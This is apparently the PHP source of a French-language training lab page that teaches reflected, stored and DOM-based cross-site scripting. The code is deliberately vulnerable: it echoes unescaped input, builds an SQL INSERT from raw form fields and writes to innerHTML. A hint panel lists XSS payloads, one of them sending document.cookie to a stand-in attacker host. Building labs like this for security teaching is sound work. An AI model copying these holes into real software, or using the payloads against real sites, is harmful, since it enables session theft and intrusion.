<?php
require_once __DIR__ . '/../../config/config.php';

$level = $_GET['level'] ?? '1';
$xss_output = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($level == '1') {
        // NIVEAU 1 : Reflected XSS - affichage direct sans encodage
        $name = $_POST['name'] ?? '';
        $xss_output = "reflected";

    } elseif ($level == '2') {
        // NIVEAU 2 : Stored XSS - stockage en base de données
        $msg = $_POST['message'] ?? '';
        $user = $_POST['username'] ?? 'Anonyme';
        $db = getVulnDB();
        // ⚠️ Pas d'échappement - Stored XSS
        $db->query("INSERT INTO messages (username, message) VALUES ('$user', '$msg')");
        $db->close();

    } elseif ($level == '3') {
        // NIVEAU 3 : DOM XSS - passé via URL fragment (géré en JS)
        $xss_output = "dom";
    }
}

// Charger les messages pour niveau 2
$messages = [];
if ($level == '2') {
    $db = getVulnDB();
    $res = $db->query("SELECT * FROM messages ORDER BY created_at DESC LIMIT 10");
    while ($row = $res->fetch_assoc()) {
        $messages[] = $row;
    }
    $db->close();
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Lab — CyberLab</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/KaliTest/assets/css/style.css">
</head>
<body>
    <canvas id="matrix-canvas"></canvas>

    <nav class="navbar">
        <div class="nav-brand">
            <div class="brand-icon">⬡</div>
            <span class="brand-name">CYBER<span class="accent">LAB</span></span>
        </div>
        <div class="nav-status" style="margin-right:auto">
            <div class="status-dot"></div>
            <span class="status-text" id="nav-time"></span>
        </div>
        <div class="nav-links">
            <a href="/KaliTest/" class="nav-link">Accueil</a>
            <a href="/KaliTest/labs/" class="nav-link">Labs</a>
        </div>
    </nav>

    <div class="page-wrapper">
        <div class="page-header">
            <p class="page-breadcrumb"><a href="/KaliTest/">Accueil</a> / <a href="/KaliTest/labs/">Labs</a> / XSS</p>
            <h1 class="page-title">💉 CROSS-SITE SCRIPTING LAB</h1>
            <p class="page-desc">Injectez du JavaScript malveillant pour voler des cookies, rediriger des utilisateurs ou exécuter du code arbitraire dans le navigateur.</p>
        </div>

        <!-- Level Selector -->
        <div style="display:flex; gap:.6rem; margin-bottom:2rem; flex-wrap:wrap">
            <a href="?level=1" class="lab-btn" style="<?= $level=='1'?'background:rgba(0,255,136,.2); border-color:var(--neon-green)':'' ?>">Niveau 1 — Reflected XSS</a>
            <a href="?level=2" class="lab-btn" style="<?= $level=='2'?'background:rgba(0,255,136,.2); border-color:var(--neon-green)':'' ?>">Niveau 2 — Stored XSS</a>
            <a href="?level=3" class="lab-btn" style="<?= $level=='3'?'background:rgba(0,255,136,.2); border-color:var(--neon-green)':'' ?>">Niveau 3 — DOM XSS</a>
        </div>

        <div class="lab-content">
            <div>
                <?php if ($level == '1'): ?>
                <!-- REFLECTED XSS -->
                <div class="lab-panel">
                    <div class="panel-header">🎯 NIVEAU 1 — Reflected XSS (Formulaire de recherche)</div>
                    <div class="panel-body">
                        <p style="font-size:.85rem; color:var(--text-secondary); margin-bottom:1rem;">
                            Cette application de recherche affiche votre saisie sans l'encoder.
                            Le script est "réfléchi" depuis le serveur vers votre navigateur.
                        </p>

                        <form method="POST" action="?level=1">
                            <div class="form-group">
                                <label class="form-label">TERME DE RECHERCHE</label>
                                <input type="text" name="name" class="form-input"
                                       placeholder="Recherchez un produit..."
                                       value="<?= $_POST['name'] ?? '' // ⚠️ XSS intentionnel ?>">
                                <p class="form-hint">💡 Ce champ affiche directement votre input — injectez du JS</p>
                            </div>
                            <button type="submit" class="btn-submit">🔍 RECHERCHER</button>
                        </form>

                        <?php if (isset($_POST['name'])): ?>
                        <div class="result-box" style="margin-top:1.5rem">
                            <div class="result-header">💬 RÉSULTATS POUR : <?= $_POST['name'] // ⚠️ XSS intentionnel ?></div>
                            <div class="result-body" style="color:var(--text-secondary); font-size:.85rem">
                                Aucun produit trouvé correspondant à "<?= $_POST['name'] ?>". <!-- ⚠️ XSS -->
                            </div>
                        </div>
                        <?php endif; ?>
                    </div>
                </div>

                <?php elseif ($level == '2'): ?>
                <!-- STORED XSS -->
                <div class="lab-panel" style="margin-bottom:1.5rem">
                    <div class="panel-header">🎯 NIVEAU 2 — Stored XSS (Forum de messages)</div>
                    <div class="panel-body">
                        <p style="font-size:.85rem; color:var(--text-secondary); margin-bottom:1rem;">
                            Les messages sont stockés en DB et affichés à tous les utilisateurs <strong>sans encodage</strong>.
                            Un XSS stocké persiste et affecte tous les visiteurs.
                        </p>

                        <form method="POST" action="?level=2">
                            <div class="form-group">
                                <label class="form-label">PSEUDO</label>
                                <input type="text" name="username" class="form-input" placeholder="Votre pseudo" value="Hacker">
                            </div>
                            <div class="form-group">
                                <label class="form-label">MESSAGE</label>
                                <textarea name="message" class="form-textarea"
                                          placeholder="Écrivez un message... ou un payload XSS"></textarea>
                                <p class="form-hint">💡 Essayez : &lt;script&gt;alert('XSS Stored!')&lt;/script&gt;</p>
                            </div>
                            <button type="submit" class="btn-submit">📤 PUBLIER</button>
                        </form>
                    </div>
                </div>

                <!-- Messages Display -->
                <div class="lab-panel">
                    <div class="panel-header">💬 MESSAGES DU FORUM (<?= count($messages) ?> messages)</div>
                    <div class="panel-body">
                        <?php foreach ($messages as $msg): ?>
                        <div style="padding:.8rem; border:1px solid var(--border-dim); border-radius:6px; margin-bottom:.8rem; background:rgba(255,255,255,.02)">
                            <div style="font-family:var(--font-mono); font-size:.7rem; color:var(--neon-blue); margin-bottom:.3rem">
                                👤 <?= $msg['username'] // ⚠️ XSS ?> — <?= $msg['created_at'] ?>
                            </div>
                            <div style="font-size:.85rem; color:var(--text-primary)">
                                <?= $msg['message'] // ⚠️ XSS INTENTIONNEL ?>
                            </div>
                        </div>
                        <?php endforeach; ?>
                        <?php if (empty($messages)): ?>
                        <p style="color:var(--text-secondary); font-size:.85rem">Aucun message. Soyez le premier !</p>
                        <?php endif; ?>
                    </div>
                </div>

                <?php elseif ($level == '3'): ?>
                <!-- DOM XSS -->
                <div class="lab-panel">
                    <div class="panel-header">🎯 NIVEAU 3 — DOM-Based XSS</div>
                    <div class="panel-body">
                        <p style="font-size:.85rem; color:var(--text-secondary); margin-bottom:1rem;">
                            L'application lit le hash (#) de l'URL et l'injecte directement dans le DOM via <code style="color:var(--neon-yellow)">innerHTML</code> — sans passer par le serveur.
                        </p>

                        <div style="margin-bottom:1rem">
                            <label class="form-label">TESTEZ CES URLS</label>
                            <code class="hint-code" style="display:block; margin:.3rem 0; cursor:pointer"
                                  onclick="window.location.hash='#Bonjour'">
                                #Bonjour (texte normal)
                            </code>
                            <code class="hint-code" style="display:block; margin:.3rem 0; cursor:pointer"
                                  onclick="window.location.hash='#&lt;img src=x onerror=alert(1)&gt;'">
                                #&lt;img src=x onerror=alert(1)&gt;
                            </code>
                            <code class="hint-code" style="display:block; margin:.3rem 0; cursor:pointer"
                                  onclick="window.location.hash='#&lt;svg onload=alert(document.cookie)&gt;'">
                                #&lt;svg onload=alert(document.cookie)&gt;
                            </code>
                        </div>

                        <div style="padding:1rem; background:rgba(0,0,0,.3); border:1px solid var(--border-dim); border-radius:6px">
                            <p style="font-family:var(--font-mono); font-size:.75rem; color:var(--text-secondary); margin-bottom:.5rem">// MESSAGE AFFICHÉ (lu depuis window.location.hash) :</p>
                            <div id="dom-output" style="font-size:.9rem; color:var(--text-primary); padding:.5rem; min-height:40px; background:rgba(255,255,255,.02); border-radius:4px">
                                ⬆️ Cliquez sur un lien ci-dessus ou modifiez le hash de l'URL
                            </div>
                        </div>

                        <div style="margin-top:1rem; padding:.8rem; background:rgba(255,51,102,.05); border:1px solid rgba(255,51,102,.2); border-radius:6px">
                            <p style="font-family:var(--font-mono); font-size:.75rem; color:var(--neon-red)">⚠️ CODE VULNÉRABLE (JavaScript côté client)</p>
                            <code style="display:block; font-family:var(--font-mono); font-size:.75rem; color:var(--neon-yellow); margin-top:.5rem; white-space:pre-wrap">
// ⚠️ VULNÉRABLE - Ne jamais faire ça !
const hash = window.location.hash.slice(1);
document.getElementById('dom-output').innerHTML = hash;
// ✅ SÉCURISÉ - Utiliser textContent à la place
// document.getElementById('dom-output').textContent = hash;
                            </code>
                        </div>
                    </div>
                </div>
                <?php endif; ?>
            </div>

            <!-- Hints -->
            <div class="hint-panel">
                <div class="hint-section">
                    <div class="panel-header">📖 GUIDE XSS</div>
                </div>

                <div class="hint-section">
                    <p class="hint-title">🎯 OBJECTIF</p>
                    <p class="hint-text">
                        Injectez du JavaScript qui s'exécute dans le navigateur.
                        Objectif final : voler le cookie de session avec
                        <code style="color:var(--neon-green)">document.cookie</code>.
                    </p>
                </div>

                <div class="hint-section">
                    <p class="hint-title">⚡ PAYLOADS</p>
                    <code class="hint-code">&lt;script&gt;alert(1)&lt;/script&gt;</code>
                    <code class="hint-code">&lt;img src=x onerror=alert(document.cookie)&gt;</code>
                    <code class="hint-code">&lt;svg onload=alert('XSS')&gt;</code>
                    <code class="hint-code">&lt;iframe src="javascript:alert(1)"&gt;</code>
                    <code class="hint-code">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>
                </div>

                <div class="hint-section">
                    <p class="hint-title">🍪 VOL DE COOKIE</p>
                    <p class="hint-text" style="font-size:.75rem">
                        <code style="color:var(--neon-yellow)">&lt;script&gt;document.location='http://attaquant.com/steal?c='+document.cookie&lt;/script&gt;</code>
                    </p>
                </div>

                <div class="hint-section">
                    <p class="hint-title">🛡️ DÉFENSES</p>
                    <p class="hint-text">
                        • htmlspecialchars() en PHP<br>
                        • Content Security Policy (CSP)<br>
                        • HTTPOnly cookies<br>
                        • DOMPurify pour innerHTML<br>
                        • X-XSS-Protection header
                    </p>
                </div>
            </div>
        </div>
    </div>

    <script src="/KaliTest/assets/js/main.js"></script>
    <?php if ($level == '3'): ?>
    <script>
        // DOM XSS intentionnellement vulnérable
        function updateDomOutput() {
            const hash = window.location.hash.slice(1);
            if (hash) {
                // ⚠️ VULNÉRABLE : innerHTML avec données non sanitisées
                document.getElementById('dom-output').innerHTML = decodeURIComponent(hash);
            }
        }
        window.addEventListener('hashchange', updateDomOutput);
        updateDomOutput();
    </script>
    <?php endif; ?>
</body>
</html>
